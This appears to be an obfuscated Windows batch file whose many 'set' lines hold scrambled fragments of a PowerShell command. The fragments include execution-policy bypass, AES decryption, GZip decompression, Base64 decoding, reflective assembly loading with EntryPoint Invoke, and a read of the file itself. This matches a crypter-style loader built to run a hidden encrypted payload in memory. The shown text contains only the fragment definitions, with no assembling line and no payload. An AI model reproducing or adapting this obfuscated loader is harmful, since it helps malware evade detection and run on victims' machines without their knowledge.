@echo off
set "XKuGmtdSHL=]::("
set "FAMdYUojEq=ress"
set "qhgAziArYQ=em.I"
set "eAVaVqBhOx=[Sys"
set "PejglZFLdR=OWlI"
set "IxWxmSRbID=oin "
set "WQJcqgFHCX=tryP"
set "aFYhLXMSrq=ay()"
set "uOvRmdItHg=.Com"
set "alJLoBRSMz=pher"
set "KosmrILVnd=.Len"
set "PdmPFBKvcJ=ddin"
set "TNcVDrBRJi=, (,"
set "dtsWKdzDYR=ck($"
set "JPjPUvBdOw=7;$r"
set "eWsGScCBup=hU.D"
set "zemxbRogeL=lit("
set "JvFITZyMFw=1..-"
set "bdfCkxBpia=u) {"
set "HbdAQGDTUr=pStr"
set "SaXVYIqWXt=ose("
set "vttNQQPgBz=B = "
set "jDPZLUlHCw=ispo"
set "UTYfVBIrbS=eam("
set "GkPlBMBOpM=();$"
set "McdSbwJySd=ion."
set "wPzmElrNrM=] -j"
set "lYUirFKEnL=ss -"
set "KmAJKEMGEG=eaEw"
set "xOYKfmArSv=oint"
set "esMVYAxCpK=hrB "
set "NjWzuzKPZm=$EOW"
set "ysTiGJMAZq=in $"
set "FypiSrdsTC=[]] "
set "SwpUcopGlW=[Sys"
set "faMxRpOPBO=ZYYc"
set "ZKcksBuDJW=New-"
set "OiVnLGAXsZ=eaEw"
set "cLJTBEFiCL=:('g"
set "QhpSpOJFvD=.Cre"
set "WoXyZbyYVb=Disp"
set "yVjECJxZVM=.GZi"
set "ILdvhDhLZr= = N"
set "zDobzVFwBC=('da"
set "fgnxTbQNVG=ke($"
set "pENOnGARyt=e]::"
set "qNlvPIkDGA=PKCS"
set "yViQrhoLLM=trea"
set "MLubHUFofo=Fo7l"
set "UlhOnOAdjU=Nt);"
set "RCSjkZGgWg=($Rz"
set "BSckKMbvps=1] -"
set "tBtJcFZkfp=$hSh"
set "danhpYcgaZ=ionM"
set "IcmTRmvTPP=LEhU"
set "TwLxJgHWGO=oArr"
set "aRiKNWbraj=)) {"
set "dXwjtRAChp=morF"
set "xzMyxNJdBv= New"
set "aiktPBPWks=lI ="
set "jAspQcnAye=EOWl"
set "WMcQyTfDDl=raph"
set "wguGlQEOvc=Obje"
set "RaPSNeqGXE=m.IO"
set "AXbTTXOQqt=lBlo"
set "qJjifqxPaE=d;$r"
set "BZiVlEdAwn=yuvu"
set "odrsOsXDix=ewLi"
set "QSbAPVWPpk=oL'["
set "boixwUySQD=EOWl"
set "vSgdQuNwgR=sion"
set "zucqKyAvFA=ing("
set "tNXObzkVsk=tsWi"
set "tXDsNlRXoi=736u"
set "WPMHayLyfT=CJXF"
set "RApIYhWxQY=]::("
set "taRktMvWMy=I = "
set "HGnpIEtVCx=yuvu"
set "FxPYgLvzPc=and "
set "rhmTBHsTSc=.Dis"
set "uIasJUrNXN=ptog"
set "fsvPlmhzBj=yTo("
set "VCVUAeHbFQ=nage"
set "EIkrRhcXmW=flec"
set "zYhcAtZlOo== $r"
set "AHdubuGgfL=7Yiv"
set "BLyKYHOQtr='')("
set "xFQIuPMcfZ=ring"
set "fetJnZlyUS=rB.T"
set "FqXsrUgDtR=.Mem"
set "EvMCtJCFRj=rans"
set "TynDyJkZgf=-1.."
set "oxocgJhhaj=lI);"
set "XOETUVXuQT=$pSn"
set "TfoANnMcKB=grap"
set "NzFhpviGhx=3); "
set "coHfdsHhvS=hrB."
set "gbJESNfOzV=tS46"
set "UPIbnQntWJ=Conv"
set "KMyiQTgiCz=tem."
set "PKgmXAlCpC='txe"
set "jIYxFWmMEW=yuvu"
set "XrqaSAQTsV=oryS"
set "InyjGwJbRu=nirt"
set "QTCPXEWeJb=[IO."
set "MWbeXFxfSz=y.En"
set "ylDzQgZUwQ=vu.I"
set "jWCsdcMTJo=y.Cr"
set "vjLxHdPhZh=rofi"
set "kkekHcuqTh=m.Re"
set "PNGZeLcAAM=orF'"
set "sIZvpJMRok='dqR"
set "UrLXELqPnW=UGTu"
set "qmzjWNegTR=.Cry"
set "HiYQGMstAf=.-16"
set "hwAueQFqqp===')"
set "WJPZDvFRZR=O.Me"
set "gEEgajENKi=Nt.T"
set "uZoybeRkQw=TllA"
set "mINckvVjKN=onve"
set "EcFQKvQLgE=form"
set "PAGTfIqntk=vj0m"
set "PjPeAphlTp=rity"
set "GvSGHZlIVf=$pSn"
set "LfMdngGxlw=$CJX"
set "MBObkRsElt=0O+g"
set "RgvGYpHwHE=$sLE"
set "gordotPFnj=cB, "
set "RvtbqlDNoo=th('"
set "IbrzdkexMB=tem."
set "VkvyJotMpX=ZBm."
set "AZeNVpxijn=('%*'"
set "bmQevCFlRE=ryuv"
set "bLjcuMEsxm=pose"
set "bIMhgksXuV=bypa"
set "vIWCHTJeRD==');"
set "hYlHnEteHZ=uhy "
set "zlGkQcrMhu=.Dis"
set "caJXhXabyT=tem."
set "DrmAYpMCdd=]::N"
set "dDPpkaijfa=[Env"
set "MpvPzUYsRj=ode]"
set "lTMDOeKAJU=.Con"
set "PUPWSTxrKh=join"
set "NsBAONGzVg=-nop"
set "klPlZEMxjU=stem"
set "NIaSioZIvS=Nt ="
set "cOGlkjgEOi=gth)"
set "lWFskGBVRB=ress"
set "KmKJXWRTAO=k; }"
set "opXWSCQfET=nZBm"
set "bCNsJzIbGE=u.Pa"
set "qfPaYvygVp=V = "
set "hwsZfnZPXm=Star"
set "dZTlRbGLob=Disp"
set "kvNuUSzDCr=bstr"
set "mPKgVjgOaq=m.IO"
set "WPmIYzagbV=stem"
set "jGHeTrJpNM=ptor"
set "iNFHLhEUAb=hy.A"
set "lJPXJOfYAr= if "
set "tYxeIKiplm=y]::"
set "UCQzHSlFwS=raph"
set "EogskOUkIy= [Sy"
set "OsZbtbpLDQ=n ''"
set "IADHeJLNFX=]::C"
set "iYQcmHteDT=..-1"
set "ZYovZRAtPg=ne);"
set "tcaFPdQhwM=ateD"
set "IIdOPorkVL=.Ass"
set "bLLrkNuwVd=);$p"
set "yMIteesDDv=Secu"
set "IYgYfgUtvq=Stre"
set "QkTZuEkJLd=Mode"
set "fAFCbpxrra=-ep "
set "miAwdAuXTS= = ["
set "SCSoewmxtk=).Sp"
set "EwGOntyDZn=yuvu"
set "dKAjuUNprs=yste"
set "RotilYYqZL=Invo"
set "BOarjukSeX=:: '"
set "izTBaJdQXC=comp"
set "GZuNBIjlBb=, $E"
set "MnKtqNcXqk=);$j"
set "Nylmilmywr=y.Ci"
set "ySRhQpvLHr=yste"
set "HjBcpOjWcF= [Sy"
set "XkuikbMoCk=EOWl"
set "tiHWmddgZz=le  "
set "CcBqcmszbQ=null"
set "KABWOTYhHU='[-1"
set "yjBVpIJbSt='[-1"
set "tOsvqbAWCg=t Sy"
set "JEGPaIQDlN=ose("
set "dtBODfyASh=rtS4"
set "QhvolgYGSF=.Cop"
set "pvUusoXuAO=)))"
set "jlMfekQnaw=Rzrl"
set "VvcLcNWnWX=OWlI"
set "BLGVQjFAla=6] -"
set "mlPidslBSX=)($R"
set "ESeGqChqgl=Fu ="
set "vnlFwaWcRE=pDZz"
set "qnkJKgSZWM=mory"
set "xQBtcKTkYB=OyzA"
set "kxDcbEKkVW=ct S"
set "ZYMvxKXwjL=S46e"
set "KzMiMgJtjT=Syst"
set "BRtsDcWxPs=sLEh"
set "tJckXxrmBt=urit"
set "MmdvAeCpEZ=ment"
set "MlWIijmBEN=isfL"
set "YAJgiinVnv=rt]:"
set "GrXcpkjSpL=.Key"
set "KqYmBaqpHS=Comp"
set "kqYNrMdqJT=  $R"
set "cYjXfabkpt=;$hS"
set "MdpHrQsYVE=se()"
set "LnEtgPXXFH= [st"
set "ieDyRBEdmJ=ct S"
set "AlwILlQhNJ=New-"
set "ySFgxeUFJZ=fore"
set "awDaFFSLgH=.Mod"
set "iOMFRRyrlb=('%~f0'"
set "hcVIpUmVtV=-joi"
set "BFlQlEomQV=pres"
set "SYCIOfkyIP=bjec"
set "oANmOXSAVk=;$rG"
set "dvJCiiwtKG=sGUc"
set "zvuCOAGwud== [S"
set "YjoHfqfWEd=ress"
set "ywZnONCGfg=('l0"
set "SUWDZhJwPw=ert]"
set "gKDWfYJxGZ= '')"
set "AWdRAoGCuN=SnNt"
